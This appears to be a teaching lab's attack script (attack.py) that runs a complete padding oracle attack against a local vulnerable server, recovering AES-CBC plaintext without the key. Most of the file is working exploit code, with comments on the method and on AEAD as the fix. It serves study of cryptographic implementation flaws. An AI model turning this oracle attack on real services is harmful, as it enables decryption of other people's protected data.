"""
IAS 102 - Day 3 - Lab 1: Padding Oracle Lab
=============================================
ATTACK SCRIPT (attack.py)

This script demonstrates a padding oracle attack against the vulnerable
server (server.py). It recovers the encrypted plaintext WITHOUT the key,
by exploiting the server's different error messages for valid vs. invalid
padding.

USAGE:
    1. Start the server in one terminal:  python server.py
    2. Run this attack in another:        python attack.py

HOW IT WORKS (high level):
    The attacker manipulates ciphertext one byte at a time. For each
    candidate byte (0-255), they ask the server to decrypt the modified
    ciphertext. If the server says "Invalid padding length" or "Invalid
    padding bytes", that candidate is wrong. If it says "Invalid block
    size" or succeeds, the candidate produced valid padding — meaning
    the attacker has learned one byte of plaintext.

    Repeat for each byte of each block. About 128 server requests per byte.
    For a 48-byte secret, that's roughly 6,000 requests — done in seconds.

WHAT TO LEARN:
    - The math (AES) is unbreakable
    - The IMPLEMENTATION (distinct error messages) is what fails
    - Modern AEAD ciphers (AES-GCM, ChaCha20-Poly1305) prevent this entirely
"""

import requests
import binascii
import sys

TARGET = "http://127.0.0.1:5000"
BLOCK_SIZE = 16


def ask_oracle(modified_ciphertext_bytes):
    """
    Send modified ciphertext to the server and return True if the
    padding was VALID (any non-padding error), False if it was INVALID.

    The vulnerability: the server returns DIFFERENT error messages
    depending on what failed during decryption. We use these to learn
    plaintext bytes.
    """
    payload = {"ciphertext_hex": binascii.hexlify(modified_ciphertext_bytes).decode()}
    try:
        r = requests.post(f"{TARGET}/decrypt", json=payload, timeout=5)
    except requests.RequestException as e:
        print(f"[!] Connection error: {e}")
        sys.exit(1)

    data = r.json()
    msg = data.get("message", "")

    # If the server says padding is INVALID, our guess was wrong.
    if "padding" in msg.lower():
        return False
    # Anything else means padding was valid (we learned a byte)
    return True


def attack_block(prev_block, target_block):
    """
    Recover one block of plaintext using the padding oracle.

    We work byte-by-byte from the END of the block to the FRONT.
    For each byte position, we try all 256 possible candidate bytes
    and find the one that produces valid padding on the server.
    """
    recovered = bytearray(BLOCK_SIZE)
    intermediate = bytearray(BLOCK_SIZE)
    request_count = 0

    # Work right-to-left: position 15, then 14, then 13, ...
    for pos in range(BLOCK_SIZE - 1, -1, -1):
        pad_value = BLOCK_SIZE - pos  # The padding value we're forcing
        found = False

        # Try every possible byte value 0-255
        for guess in range(256):
            request_count += 1
            forged = bytearray(BLOCK_SIZE)

            # For positions we've already cracked, set them to produce
            # the current padding value
            for j in range(pos + 1, BLOCK_SIZE):
                forged[j] = intermediate[j] ^ pad_value

            # For the position we're guessing, try this candidate
            forged[pos] = guess

            # Combine our forged previous block with the target block
            attack_payload = bytes(forged) + target_block
            if ask_oracle(attack_payload):
                # Skip false positive when pos=15 and the actual padding
                # in the last position happens to match by coincidence.
                if pos == BLOCK_SIZE - 1:
                    # Verify by changing byte at pos-1 and retrying.
                    # If padding is still valid, this is a real hit.
                    test = bytearray(forged)
                    test[pos - 1] ^= 1
                    if not ask_oracle(bytes(test) + target_block):
                        continue  # was a false positive, keep trying
                intermediate[pos] = guess ^ pad_value
                recovered[pos] = intermediate[pos] ^ prev_block[pos]
                found = True
                ch = chr(recovered[pos]) if 32 <= recovered[pos] < 127 else "?"
                print(f"  [+] Position {pos:2d}: 0x{recovered[pos]:02x} ('{ch}')")
                break

        if not found:
            print(f"  [!] Failed to recover byte at position {pos}")
            return None, request_count

    return bytes(recovered), request_count


def main():
    print("=" * 60)
    print("IAS 102 Padding Oracle Attack")
    print("=" * 60)

    # Step 1 — get the ciphertext from the server
    print(f"\n[*] Fetching encrypted secret from {TARGET}/get_ciphertext...")
    try:
        r = requests.get(f"{TARGET}/get_ciphertext", timeout=5)
    except requests.RequestException as e:
        print(f"[!] Cannot reach server: {e}")
        print("[!] Make sure server.py is running in another terminal.")
        sys.exit(1)

    blob_hex = r.json()["ciphertext_hex"]
    blob = binascii.unhexlify(blob_hex)
    print(f"[+] Received {len(blob)} bytes of ciphertext")

    # Step 2 — split into blocks
    # First 16 bytes = IV, rest = ciphertext blocks
    iv = blob[:BLOCK_SIZE]
    ciphertext = blob[BLOCK_SIZE:]
    num_blocks = len(ciphertext) // BLOCK_SIZE
    blocks = [ciphertext[i*BLOCK_SIZE:(i+1)*BLOCK_SIZE] for i in range(num_blocks)]

    print(f"[+] IV: {binascii.hexlify(iv).decode()}")
    print(f"[+] Ciphertext blocks: {num_blocks}")

    # Step 3 — attack each block
    plaintext = b""
    total_requests = 0
    prev = iv

    for i, block in enumerate(blocks):
        print(f"\n[*] Attacking block {i+1}/{num_blocks}...")
        recovered, count = attack_block(prev, block)
        total_requests += count
        if recovered is None:
            print(f"[!] Attack failed on block {i+1}")
            sys.exit(1)
        plaintext += recovered
        prev = block

    # Step 4 — strip PKCS#7 padding from the result
    pad_len = plaintext[-1]
    if 1 <= pad_len <= 16:
        plaintext = plaintext[:-pad_len]

    print("\n" + "=" * 60)
    print("ATTACK COMPLETE")
    print("=" * 60)
    print(f"[+] Total server requests: {total_requests}")
    print(f"[+] Plaintext length: {len(plaintext)} bytes")
    print(f"[+] RECOVERED PLAINTEXT:")
    print(f"\n    {plaintext.decode('utf-8', errors='replace')}\n")
    print("[!] You decrypted the message WITHOUT the key.")
    print("[!] The math (AES) was perfect. The implementation leaked.")


if __name__ == "__main__":
    main()
